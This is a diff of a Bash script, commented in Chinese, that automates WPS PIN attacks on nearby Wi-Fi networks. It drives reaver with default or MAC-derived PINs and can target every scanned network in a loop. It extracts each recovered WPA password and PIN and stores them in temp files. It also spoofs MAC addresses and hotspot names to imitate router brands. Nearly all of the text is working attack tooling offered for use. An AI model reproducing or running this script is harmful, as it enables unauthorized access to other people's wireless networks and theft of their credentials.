@@ -66,51 +66,34 @@ MacAddress() {
 GetMacName() { 																																																														  
 	[ ! -e /etc/config/scp/ap_mac.txt ] && PrintFalseInfo "没有找到存放ap mac地址的文档，请重新设置安全设置脚本!" && exit #没有找到存放ap的mac地址的文档提示并退出
 	get_mac_num=$(cat /etc/config/scp/ap_mac.txt | wc -l)	#获取mac地址的总数量
-	[ "${get_mac_num}" == "0" ] && PrintFalseInfo "存放mac地址的文档是空的，这样无法创建热点，正在退出脚本" && exit	#判断mac地址的数量为0的时候提示并退出脚本
-	get_random_wei=$(echo ${get_mac_num} | wc -L)   #获取ap的mac地址数量的位数
-	if [ "${get_random_wei}" != "1" ];then  #检测位数不是1位的
-		num=1
-		while :;do
-			random_num=$(head -n 5 /dev/urandom 2>/dev/null | tr -dc "0123456789"  2>/dev/null | head -c1)  #获取随机数值
-			if [[ "${random_num}" != "0" && "${random_num}" -le "${get_random_wei}" ]];then   #判断获取到的实际数值是否超过了ap的mac地址的位数没有则进行赋值。
-				random_max="${random_num}"; break
-			fi
-			[ "${num}" == "100" ] && exit   #循环100次，则退出程序
-			let num+=1  #计数
-		done
-	else    #位数为1位的就赋值为1
-		random_max=1
-	fi
-	num=1	#计数
+	num=0	#计数
 	while :;do
-		getRandomNum=$(head -n 5 /dev/urandom 2>/dev/null | tr -dc "0123456789"  2>/dev/null | head -c${random_max})	#获取随机数值，用来到ap文档中提取mac地址
-		if [[ "${getRandomNum}" != "0" && "${getRandomNum}" -le "${get_mac_num}" ]];then								#检查获取到的随机数值是否超过了ap总行数，没有则往下进行
-			get_name_mac="$(sed -n "${getRandomNum}p" /etc/config/scp/ap_mac.txt | sed -n "1p" )"	#从文档中获取mac地址和名称
-			host_name=$(echo "${get_name_mac}" | cut -d '^' -f 1 | sed -n "1p")						#提取名称
-			if [ "${host_name}" == "CMCC" ];then
-				while :;do
-					get_last_name=$(head -n 5 /dev/urandom 2>/dev/null | tr -dc "a-zA-Z0-9"  2>/dev/null | head -c4)	#随机生成最后一段名称
-					host_name="${host_name}-${get_last_name}"				#汇总名字
-					[ ! -z "${host_name}" ] && break						#名字不为空则退出循环
-				done
-			elif [ "${host_name}" == "@PHICOMM" ];then
-				while :;do
-					get_last_name=$(head -n 5 /dev/urandom 2>/dev/null | tr -dc "a-zA-Z0-9"  2>/dev/null | head -c2)	#随机生成最后一段名称
-					host_name="${host_name}_${get_last_name}"				#汇总名字
-					[ ! -z "${host_name}" ] && break						#名字不为空则退出循环
-				done
-			else
-				while :;do
-					get_last_name=$(head -n 5 /dev/urandom 2>/dev/null | tr -dc "A-F0-9"  2>/dev/null | head -c4)		#随机生成最后一段名称
-					host_name="${host_name}_${get_last_name}"				#汇总名字
-					[ ! -z "${host_name}" ] && break						#名字不为空则退出循环
-				done			   
-			fi																																																	
-			wlan_mac="$(echo "${get_name_mac}" | cut -d '^' -f 2)$(hexdump -n 3 -e '/1 ":%02x"' /dev/urandom  | sed -n "1p")"	#根据AP品牌mac地址前三段，再随机生成后三段，获取mac地址
-			[[ ! -z "${host_name}" && ! -z "${wlan_mac}" && "$(echo "${wlan_mac}" | wc -L)" == "17" ]] && break	#检查mac地址没有问题，主机名不是空的就跳出循环。
-		fi
 		[ "${num}" == "100" ] && exit	#有一百次的机会，到了一百次就退出脚本。
 		let num=num+1	#计数器
+		get_name_mac="$(sed -n "$(awk -v lineNum="$get_mac_num" 'BEGIN{srand();print int(rand() * 1000000 % lineNum +1)}')p" /etc/config/scp/ap_mac.txt)"
+		[ -z "${get_name_mac}" ] && continue
+		host_name=$(echo "${get_name_mac}" | cut -d '^' -f 1 | sed -n "1p")						#提取名称
+		if [ "${host_name}" == "CMCC" ];then
+			while :;do
+				get_last_name=$(head -n 5 /dev/urandom 2>/dev/null | tr -dc "a-zA-Z0-9"  2>/dev/null | head -c4)	#随机生成最后一段名称
+				host_name="${host_name}-${get_last_name}"				#汇总名字
+				[ ! -z "${host_name}" ] && break						#名字不为空则退出循环
+			done
+		elif [ "${host_name}" == "@PHICOMM" ];then
+			while :;do
+				get_last_name=$(head -n 5 /dev/urandom 2>/dev/null | tr -dc "a-zA-Z0-9"  2>/dev/null | head -c2)	#随机生成最后一段名称
+				host_name="${host_name}_${get_last_name}"				#汇总名字
+				[ ! -z "${host_name}" ] && break						#名字不为空则退出循环
+			done
+		else
+			while :;do
+				get_last_name=$(head -n 5 /dev/urandom 2>/dev/null | tr -dc "A-F0-9"  2>/dev/null | head -c4)		#随机生成最后一段名称
+				host_name="${host_name}_${get_last_name}"				#汇总名字
+				[ ! -z "${host_name}" ] && break						#名字不为空则退出循环
+			done			   
+		fi																																																	
+		wlan_mac="$(echo "${get_name_mac}" | cut -d '^' -f 2)$(hexdump -n 3 -e '/1 ":%02x"' /dev/urandom  | sed -n "1p")"	#根据AP品牌mac地址前三段，再随机生成后三段，获取mac地址
+		[[ ! -z "${host_name}" && ! -z "${wlan_mac}" && "$(echo "${wlan_mac}" | wc -L)" == "17" ]] && break	#检查mac地址没有问题，主机名不是空的就跳出循环。
 	done
 }
 
@@ -373,6 +356,7 @@ Stop_Scan_Wifi() {
 
 #获取wifi相关的信息
 Get_Wifi_Info() {
+	printf '\033[8;32;122t'	#控制窗口大小
     PrintTrueInfo "正在扫描wps的WiFi，请等待20秒......"
     #删除存放信息的文档===============================>
     [ -f /tmp/wps.txt ] && rm /tmp/wps.txt
@@ -496,39 +480,136 @@ CheckPinInfo() {
     ret_str=    #定义一个返回值变量
     [ -f /tmp/${Bsid}.wps ] && rm  /tmp/${Bsid}.wps
     KillSofteware; TestAgenPin; [[ $? == 0 ]] && { ret_str=2;return; }
-    clear; echo -e "\n\n${yellow}* * * ${Esid} 网络没有希望了，尝试其它的网络吧* * *${none}\n"
-    [ "${select_num}" != "a" ] && { Notifi "回车后继续pin"; ret_str=1; } || return 0 #不是选择pin所有的WiFi，提示用户，并返回
+    clear; { [ "${count_num}" == "${circulate_num}" ] && echo -e "\n\n${yellow}* * * ${Esid} 网络没有希望了，尝试其它的网络吧* * *${none}\n"; }
+    [ "${select_num}" != "a" ] && { [ "${count_num}" == "${circulate_num}" ] && { Notifi "回车后继续pin"; ret_str=1; }; } || return 0 #不是选择pin所有的WiFi，提示用户，并返回
+}
+
+#删除临时文件
+Delete_WPC() { rm -f ./*.wpc &>/dev/null; }
+
+#秒pin WiFi
+Attack_Wifi() {
+	BSSID=${Bsid}; ESSID=${Esid}    #转换变量名称
+	head_BSSID=$(echo ${BSSID} | cut -d : -f 1-3)   #获取mac地址的头三段
+	if [ -z "${PIN}" ];then
+		if [ -f /tmp/pins.txt ];then    #检查默认的pin码文档
+			get_pin=$(cat /tmp/pins.txt | grep ${head_BSSID})   #在默认pin码文档中查找这个品牌的mac地址，
+			if [ ! -z "${get_pin}" ];then   #存在的话就提取，就提取默认的pin码
+				PIN=$(echo ${get_pin} | cut -d - -f 2)
+				PrintTrueInfo "尝试pin值：$PIN"
+			else    #没有找到默认的pin码，就根据mac地址计算出来pin码
+				CalcularPin #根据WiFi的mac计算出来PIN码
+			fi
+		else    #没有找到默认pin码的文档就根据WiFi的mac计算出来PIN码
+			CalcularPin #根据WiFi的mac计算出来PIN码
+		fi 
+	else
+		PrintTrueInfo "尝试pin值：$PIN"
+	fi
+	{ reaver -n -l61 -i ${monitor_driver} -p ${PIN} -b $Bsid -c $Chanel -S -N -d0 -t5 -vv | tee /tmp/${Bsid}.wps; }&    #开始pin，放到后台，把pin过程中生成的信息放到指定文档中
+	RE_ID=$!    #获取执行id
+	AgenPin=    #定义再次pin变量
+	ret_str=    #定义一个返回值变量
+	line_num=1
+	while :;do
+		if [ ! -z ${AgenPin} ];then #不为空则重新pin
+			PrintTrueInfo "尝试pin值：$PIN"
+			{ reaver -n -l61 -i ${monitor_driver} -p ${PIN} -b $Bsid -c $Chanel -S -N -d0 -t5 -vv | tee /tmp/${Bsid}.wps; }&    #开始pin，放到后台，把pin过程中生成的信息放到指定文档中
+			RE_ID=$!; AgenPin=  #获取执行id，给判断再次pin变量清空
+		fi
+		if [ -f /tmp/${Bsid}.wps ];then
+			PINES=`cat /tmp/${Bsid}.wps | grep -e "Trying pin" -e "Probando pin" | sort -u | wc -l` #检测尝试pin有多少行，去重复
+			PINES_b=`cat /tmp/${Bsid}.wps | grep -e "Trying pin" -e "Probando pin" | wc -l`         #检车尝试pin有多少行
+			error_a=`cat /tmp/${Bsid}.wps | grep 'Failed to associaten' | wc -l`                    #检测失败的连线多少行
+			wps_line_num=$(cat /tmp/${Bsid}.wps | wc -l)                                            #检测wps存储的信息多少行
+			if [ ! -z "$(cat /tmp/${Bsid}.wps | grep 'WPA PSK')" ];then                             #检测pin出来密码
+				passwd_str="$(cat /tmp/${Bsid}.wps | grep 'WPA PSK' | cut -d : -f 2 | sed "s/'//g" )"   #提取密码
+				pin_str="$(cat /tmp/${Bsid}.wps | grep 'WPS PIN' | cut -d : -f 2 | sed "s/'//g" )"      #提取PIN码
+				clear; echo -e "\n\n${yellow}* * * ${Esid} 成功ping出密码* * *${none}\n"
+				echo -e "\n${yellow}pin值：${pin_str}${none}"; echo -e "\n${yellow}密码 ：${passwd_str}${none}"; echo -e "\n${yellow}MAC地址 ：${Bsid}${none}\n\n"
+				[[ -f /tmp/all_passwd.txt && -n "$(grep "${Bsid}" /tmp/all_passwd.txt 2>/dev/null)" ]] && passwd_path="/tmp/pin_passwd.txt" || passwd_path="/tmp/pin_passwd.txt /tmp/all_passwd.txt"
+				echo -e "\n\n* * * ${Esid} 成功ping出密码* * *\npin值：${pin_str}\n密码 ：${passwd_str}\nMAC地址：${Bsid}" | tee -a ${passwd_path} &>/dev/null
+				if [ "${select_num}" != "a" ];then  #不是选择pin所有的WiFi，提示用户记录好密码
+					Notifi "请记录好pin出来的密码，回车后继续pin"; [ -f  /tmp/${Bsid}.wps ] && rm  /tmp/${Bsid}.wps
+				fi
+				return 3
+			elif [ ! -z "$(echo ${wps_line_num} | egrep '^[354]$')" ];then  #判断pin状态，总行数是3,5,4行的，证明是卡主了就直接终止pin就行
+				[ "${line_num}" == "5" ] && { CheckPinInfo; { [ "$ret_str" == "1" ] && return 0; } ;{ [ "$ret_str" == "2" ] && continue; };break; }     #给了5次机会
+				let line_num+=1
+			elif [ "$(cat /tmp/${Bsid}.wps | wc -l)" -ge "150" ];then    #判断pin状态，总行数是大于等于150行的还没有pin出来，证明没有希望了，直接终止pin就行
+				CheckPinInfo; { [ "$ret_str" == "1" ] && return 0; } ;{ [ "$ret_str" == "2" ] && continue; }; break   #判断检查pin状态返回值，不为0证明用户没有选择全部pin，就退出此函数就行，选择了pin全部就终止这个循环.
+			elif [ "$(cat /tmp/${Bsid}.wps | grep 'Failed to recover WPA key' | wc -l)" == "1" ];then   #检查到这个警告的时候，就没有希望pin下去了。
+				CheckPinInfo;  { [ "$ret_str" == "1" ] && return 0; } ;{ [ "$ret_str" == "2" ] && continue; }; break   #判断检查pin状态返回值，不为0证明用户没有选择全部pin，就退出此函数就行，选择了pin全部就终止这个循环。           
+			elif [ "$(cat /tmp/${Bsid}.wps | grep 'WARNING: Detected' | wc -l)" == "1" ];then   #检查到这个警告的时候，就没有希望pin下去了。
+				CheckPinInfo;  { [ "$ret_str" == "1" ] && return 0; } ;{ [ "$ret_str" == "2" ] && continue; }; break   #判断检查pin状态返回值，不为0证明用户没有选择全部pin，就退出此函数就行，选择了pin全部就终止这个循环。           
+			elif [ "$(cat /tmp/${Bsid}.wps | grep 'Sending authentication request' | wc -l)" == "5" ];then  #检查到发送请求被拒的时候超过5次，就没有希望pin下去了。
+				CheckPinInfo;{ [ "$ret_str" == "1" ] && return 0; } ;{ [ "$ret_str" == "2" ] && continue; }; break   #判断检查pin状态返回值，不为0证明用户没有选择全部pin，就退出此函数就行，选择了pin全部就终止这个循环。
+			elif [ "$(cat /tmp/${Bsid}.wps |  grep -e "0x02" -e "0x03" -e "0x04")" != "" ];then     #检查到这些进制的时候，没有希望pin下去了。
+				CheckPinInfo;{ [ "$ret_str" == "1" ] && return 0; } ;{ [ "$ret_str" == "2" ] && continue; }; break   #判断检查pin状态返回值，不为0证明用户没有选择全部pin，就退出此函数就行，选择了pin全部就终止这个循环。
+			elif [ "$(cat /tmp/${Bsid}.wps | grep 'Sending EAPOL START request' | wc -l)" == "4" ];then  #检查到发送请求被拒的时候超过5次，就没有希望pin下去了。
+				CheckPinInfo;{ [ "$ret_str" == "1" ] && return 0; } ;{ [ "$ret_str" == "2" ] && continue; }; break   #判断检查pin状态返回值，不为0证明用户没有选择全部pin，就退出此函数就行，选择了pin全部就终止这个循环。
+			elif [ "${PINES_b}" -ge "2" ] && [ "${PINES}" == "1" ];then #检测尝试pin出现多行，就没有希望pin下去了
+				CheckPinInfo;{ [ "$ret_str" == "1" ] && return 0; } ;{ [ "$ret_str" == "2" ] && continue; }; break   #判断检查pin状态返回值，不为0证明用户没有选择全部pin，就退出此函数就行，选择了pin全部就终止这个循环。
+			fi
+		fi
+		read -t 1 -n 1 selct_q  #等待用户1秒钟，输入任意键终止pin码
+		if [ "$?" == "0" ];then #检测输入任意键后，开始退出此次pin，不是退出脚本
+			if [ "${select_num}" == "a" ];then  #检查用户输入的是pin全部wifi，就显示所有pin出来密码的网络。
+				KillSofteware; clear
+				[ -f /tmp/pin_passwd.txt ] && { PrintTrueInfo "pin出来的密码，请记录好："; cat /tmp/pin_passwd.txt; Notifi "回车后退出"; return 5; }
+			else    #没有选择pin所有网络，直接退出
+				PrintTrueInfo "正在退出. . ."; KillSofteware 
+			fi
+			rm /tmp/*.wps; return 5 #删除临时文件
+		fi
+	done
 }
 
 #菜单
 Menu() {
 	while :;do
+		[ -f /tmp/pin_passwd.txt ] && rm /tmp/pin_passwd.txt    #把存在存放密码的文档删除
 		PIN=	#定义一个空的pin码变量
-        [ -f /tmp/pin_passwd.txt ] && rm /tmp/pin_passwd.txt    #把存在存放密码的文档删除
 		[ ! -e /tmp/WPS_WS.txt ] && PrintFalseInfo "没有找到WPS_WS.txt文档" && return 1
-		clear; echo -e "${yellow}No.\tPower\tBSSID\t\tChannel\tESSID${none}"    #显示标题
+		KillSofteware; clear; echo -e "${yellow}No.\tPower\tBSSID\t\tChannel\tESSID${none}"    #显示标题
 		cat /tmp/WPS_WS.txt #显示wifi信息
         echo ""
-		echo -en "${magenta}请选择要Pin的WiFi序列号【1-${wifi_num}】，重新扫描【s】，全部pin【a】，退出【q】\n指定pin码【WiFi序列号空格pin码】如：1 12345678。请按提示输入：${none}"
-        read select_num #存放用户输入的参数
-        [ -z "${select_num}" ] && Error "输入为空，重新输入一下" && continue  #输入为空提示用户，并返回重新输入。
+		echo -en "${magenta}请选择要Pin的WiFi序列号【1-${wifi_num}】，重新扫描【s】，全部pin【a】，退出【q】，列出pin出来的密码【t】\n指定pin码【WiFi序列号空格pin码】如：1 12345678。\n可指定每个WiFi pin几次，不设置默认pin两次，设置方法如：1 3 或者a 3 \n请按提示输入：${none}"
+        read select_nums #存放用户输入的参数
+        [ -z "${select_nums}" ] && Error "输入为空，重新输入一下" && continue  #输入为空提示用户，并返回重新输入。
+		select_num=$(echo "${select_nums}" |awk '{print $1}')
 		if [ "${select_num}" == "s" ];then  #输入s，重新扫描wifi信息。
 			Get_Wifi_Info; continue
 		elif [ "${select_num}" == "q" ];then    #输入q，先删除监听热点、终止程序，最后退出脚本
-            DeleteMonitor; KillSofteware; exit
+            DeleteMonitor; KillSofteware; Delete_WPC; exit
         elif [ "${select_num}" == "a" ];then    #输入a，pin所有的wifi信息。
             echo -e "\n\n已选择pin所有网络\n"
-		elif [[ "$(echo "${select_num}" |awk '{print NF}')" == '2' ]];then
-			PIN="$(echo "${select_num}" |awk '{print $2}')";select_num="$(echo "${select_num}" |awk '{print $1}')"	#获取pin码和选择wifi的序列号
+		elif [ ${select_num} == t ];then	#输出pin出来的密码
+			if [[ -f /tmp/all_passwd.txt && -n "$(cat /tmp/all_passwd.txt 2>/dev/null)" ]];then
+				PrintTrueInfo "pin出来的密码，请记录好："; cat /tmp/all_passwd.txt; Notifi "回车后返回菜单"; continue
+			else
+				Notifi "没有找到pin出来的密码，回车后返回菜单"; continue
+			fi
+		elif [ -n "$(echo ${select_num} | egrep '[a-zA-Z]')" ];then    #q退出程序，并开始删除热点、开启网卡无线功能、终止程序
+			Error "输入的内容没有定义功能，请按照提示输入"; continue
+		elif [[ "$(echo "${select_nums}" |awk '{print NF}')" == '2' && "$(echo "${select_nums}" |awk '{print $2}' | wc -c)" == '9' ]];then
+			PIN="$(echo "${select_nums}" |awk '{print $2}')"	#获取pin码
 			#判断pin码和WiFi序列号是否正确，不正确循环并提示
-			[[ -z "$(echo "${select_num}" | egrep "^[0-9]+$" )" || -z "$(echo "${PIN}" | egrep "^[0-9]{8}$")" ]] && { Error "输入的WiFi序列或者pin码不正确，请按照提示输入";continue; } 	
+			[[ -z "$(echo "${PIN}" | egrep "^[0-9]{8}$")" ]] && { Error "输入的WiFi序列或者pin码不正确，请按照提示输入";continue; }
+			break	
 		elif [[ "${select_num}" -gt "${wifi_num}" || "${select_num}" -lt "0" ]];then    #检查输入的数值大于wifi总数量提示报错信息，返回主菜单
 			Error "输入的数值超出范围，请按照提示的范围输入序列号"; continue
         elif [ -z "$(echo "${select_num}" | egrep "^[0-9]+$" )" ];then  #检查输入的是否为纯数字，不是的话提示报错信息，返回主菜单
 			Error "输入的数值不正确，请按照提示输入"; continue           
 		fi
+		circulate_num="$(echo "${select_nums}" |awk '{print $2}')"
+		if [ -n "${circulate_num}" ];then
+			[ -z "$(echo "${circulate_num}" | egrep "^[0-9]+$")" ] && Error "输入的循环次数不对，不是纯数字" && continue
+			[[ "${circulate_num}" -gt "15" || "${circulate_num}" -lt "0" ]] && Error "输入的循环次数不要太大，把控在15次以内就行，输入为0是取消秒pin" && continue
+		fi
         break
 	done
+	circulate_num="${circulate_num:-2}"	#当检测循环次数为空的时候默认赋值为2次。
     count=1
     while :;do
         if [ "${select_num}" == "a" ];then  #用户选择pin所有网络
@@ -544,81 +625,15 @@ Menu() {
             [ -z ${Bsid} ] && continue  #检测wifi的mac地址为空，重新执行循环
             PrintTrueInfo "已选择【${Esid}】"; sleep 1
 		fi
-        BSSID=${Bsid}; ESSID=${Esid}    #转换变量名称
-        head_BSSID=$(echo ${BSSID} | cut -d : -f 1-3)   #获取mac地址的头三段
-		if [ -z "${PIN}" ];then
-			if [ -f /tmp/pins.txt ];then    #检查默认的pin码文档
-				get_pin=$(cat /tmp/pins.txt | grep ${head_BSSID})   #在默认pin码文档中查找这个品牌的mac地址，
-				if [ ! -z "${get_pin}" ];then   #存在的话就提取，就提取默认的pin码
-					PIN=$(echo ${get_pin} | cut -d - -f 2)
-					PrintTrueInfo "尝试pin值：$PIN"
-				else    #没有找到默认的pin码，就根据mac地址计算出来pin码
-					CalcularPin #根据WiFi的mac计算出来PIN码
-				fi
-			else    #没有找到默认pin码的文档就根据WiFi的mac计算出来PIN码
-				CalcularPin #根据WiFi的mac计算出来PIN码
-			fi 
-		else
-			PrintTrueInfo "尝试pin值：$PIN"
-		fi
-        { reaver -n -l61 -i ${monitor_driver} -p ${PIN} -b $Bsid -c $Chanel -S -N -d0 -t5 -vv | tee /tmp/${Bsid}.wps; }&    #开始pin，放到后台，把pin过程中生成的信息放到指定文档中
-        RE_ID=$!    #获取执行id
-        AgenPin=    #定义再次pin变量
-        ret_str=    #定义一个返回值变量
-        line_num=1
-        while :;do
-            if [ ! -z ${AgenPin} ];then #不为空则重新pin
-                PrintTrueInfo "尝试pin值：$PIN"
-                { reaver -n -l61 -i ${monitor_driver} -p ${PIN} -b $Bsid -c $Chanel -S -N -d0 -t5 -vv | tee /tmp/${Bsid}.wps; }&    #开始pin，放到后台，把pin过程中生成的信息放到指定文档中
-                RE_ID=$!; AgenPin=  #获取执行id，给判断再次pin变量清空
-            fi
-            if [ -f /tmp/${Bsid}.wps ];then
-                PINES=`cat /tmp/${Bsid}.wps | grep -e "Trying pin" -e "Probando pin" | sort -u | wc -l` #检测尝试pin有多少行，去重复
-                PINES_b=`cat /tmp/${Bsid}.wps | grep -e "Trying pin" -e "Probando pin" | wc -l`         #检车尝试pin有多少行
-                error_a=`cat /tmp/${Bsid}.wps | grep 'Failed to associaten' | wc -l`                    #检测失败的连线多少行
-                wps_line_num=$(cat /tmp/${Bsid}.wps | wc -l)                                            #检测wps存储的信息多少行
-                if [ ! -z "$(cat /tmp/${Bsid}.wps | grep 'WPA PSK')" ];then                             #检测pin出来密码
-                    passwd_str="$(cat /tmp/${Bsid}.wps | grep 'WPA PSK' | cut -d : -f 2 | sed "s/'//g" )"   #提取密码
-                    pin_str="$(cat /tmp/${Bsid}.wps | grep 'WPS PIN' | cut -d : -f 2 | sed "s/'//g" )"      #提取PIN码
-                    clear; echo -e "\n\n${yellow}* * *${Esid} 成功ping出密码* * *${none}\n"
-                    echo -e "\n${yellow}pin值：${pin_str}${none}"
-                    echo -e "\n${yellow}密码 ：${passwd_str}${none}\n\n"
-                    echo -e "\n\n* * *${Esid} 成功ping出密码* * *\npin值：${pin_str}\n密码 ：${passwd_str}" >> /tmp/pin_passwd.txt
-                    if [ "${select_num}" != "a" ];then  #不是选择pin所有的WiFi，提示用户记录好密码
-                        Notifi "请记录好pin出来的密码，回车后继续pin"; [ -f  /tmp/${Bsid}.wps ] && rm  /tmp/${Bsid}.wps
-                        return
-                    fi
-                    break
-                elif [ ! -z "$(echo ${wps_line_num} | egrep '^[354]$')" ];then  #判断pin状态，总行数是3,5,4行的，证明是卡主了就直接终止pin就行
-                    [ "${line_num}" == "5" ] && { CheckPinInfo; { [ "$ret_str" == "1" ] && return 0; } ;{ [ "$ret_str" == "2" ] && continue; };break; }     #给了5次机会
-                    let line_num+=1
-                elif [ "$(cat /tmp/${Bsid}.wps | wc -l)" -ge "150" ];then    #判断pin状态，总行数是大于等于150行的还没有pin出来，证明没有希望了，直接终止pin就行
-                    CheckPinInfo; { [ "$ret_str" == "1" ] && return 0; } ;{ [ "$ret_str" == "2" ] && continue; }; break   #判断检查pin状态返回值，不为0证明用户没有选择全部pin，就退出此函数就行，选择了pin全部就终止这个循环.
-                elif [ "$(cat /tmp/${Bsid}.wps | grep 'Failed to recover WPA key' | wc -l)" == "1" ];then   #检查到这个警告的时候，就没有希望pin下去了。
-                    CheckPinInfo;  { [ "$ret_str" == "1" ] && return 0; } ;{ [ "$ret_str" == "2" ] && continue; }; break   #判断检查pin状态返回值，不为0证明用户没有选择全部pin，就退出此函数就行，选择了pin全部就终止这个循环。           
-                elif [ "$(cat /tmp/${Bsid}.wps | grep 'WARNING: Detected' | wc -l)" == "1" ];then   #检查到这个警告的时候，就没有希望pin下去了。
-                    CheckPinInfo;  { [ "$ret_str" == "1" ] && return 0; } ;{ [ "$ret_str" == "2" ] && continue; }; break   #判断检查pin状态返回值，不为0证明用户没有选择全部pin，就退出此函数就行，选择了pin全部就终止这个循环。           
-                elif [ "$(cat /tmp/${Bsid}.wps | grep 'Sending authentication request' | wc -l)" == "5" ];then  #检查到发送请求被拒的时候超过5次，就没有希望pin下去了。
-                    CheckPinInfo;{ [ "$ret_str" == "1" ] && return 0; } ;{ [ "$ret_str" == "2" ] && continue; }; break   #判断检查pin状态返回值，不为0证明用户没有选择全部pin，就退出此函数就行，选择了pin全部就终止这个循环。
-                elif [ "$(cat /tmp/${Bsid}.wps |  grep -e "0x02" -e "0x03" -e "0x04")" != "" ];then     #检查到这些进制的时候，没有希望pin下去了。
-                    CheckPinInfo;{ [ "$ret_str" == "1" ] && return 0; } ;{ [ "$ret_str" == "2" ] && continue; }; break   #判断检查pin状态返回值，不为0证明用户没有选择全部pin，就退出此函数就行，选择了pin全部就终止这个循环。
-                elif [ "$(cat /tmp/${Bsid}.wps | grep 'Sending EAPOL START request' | wc -l)" == "4" ];then  #检查到发送请求被拒的时候超过5次，就没有希望pin下去了。
-                    CheckPinInfo;{ [ "$ret_str" == "1" ] && return 0; } ;{ [ "$ret_str" == "2" ] && continue; }; break   #判断检查pin状态返回值，不为0证明用户没有选择全部pin，就退出此函数就行，选择了pin全部就终止这个循环。
-                elif [ "${PINES_b}" -ge "2" ] && [ "${PINES}" == "1" ];then #检测尝试pin出现多行，就没有希望pin下去了
-                    CheckPinInfo;{ [ "$ret_str" == "1" ] && return 0; } ;{ [ "$ret_str" == "2" ] && continue; }; break   #判断检查pin状态返回值，不为0证明用户没有选择全部pin，就退出此函数就行，选择了pin全部就终止这个循环。
-                fi
-            fi
-            read -t 1 -n 1 selct_q  #等待用户1秒钟，输入任意键终止pin码
-            if [ "$?" == "0" ];then #检测输入任意键后，开始退出此次pin，不是退出脚本
-                if [ "${select_num}" == "a" ];then  #检查用户输入的是pin全部wifi，就显示所有pin出来密码的网络。
-                    KillSofteware; clear
-                    [ -f /tmp/pin_passwd.txt ] && { PrintTrueInfo "pin出来的密码，请记录好："; cat /tmp/pin_passwd.txt; Notifi "回车后退出"; return 0; }
-                else    #没有选择pin所有网络，直接退出
-                    PrintTrueInfo "正在退出. . ."; KillSofteware 
-                fi
-                rm /tmp/*.wps; return 0 #删除临时文件
-            fi
-        done
+		count_num=1;while [ "${count_num}" -le "${circulate_num}" ];do	#根据设定的循环次数重复pin几次
+			PrintTrueInfo "正在尝试pin第 ${count_num} 次";sleep 2; Attack_Wifi
+			case $? in 
+				"3") break;;
+				"5") return 0;;
+			esac
+			let count_num+=1
+		done
+		[ "${select_num}" != "a" ] && break
     done
     if [ "${select_num}" == "a" ];then  #全部网络pin完了，就显示下面的信息
         KillSofteware;clear
@@ -629,6 +644,7 @@ Menu() {
         fi
         Notifi "回车后继续"; return 0
     fi
+
 }
 
 #找无线驱动名称
@@ -671,6 +687,7 @@ CheckSoftware() {
 }
 
 #主要程序===============================================>
+Delete_WPC	#删除wpc临时文件
 CheckSoftware   #检测抓包脚本依赖的软件是否存在
 CheckMonitor    #检测监听热点删除监听热点
 [ ! -e /etc/config/scp/mac.txt ] && MacAddress  #检测存放AP的mac地址文档不存在，执行生成mac地址文档的函数。
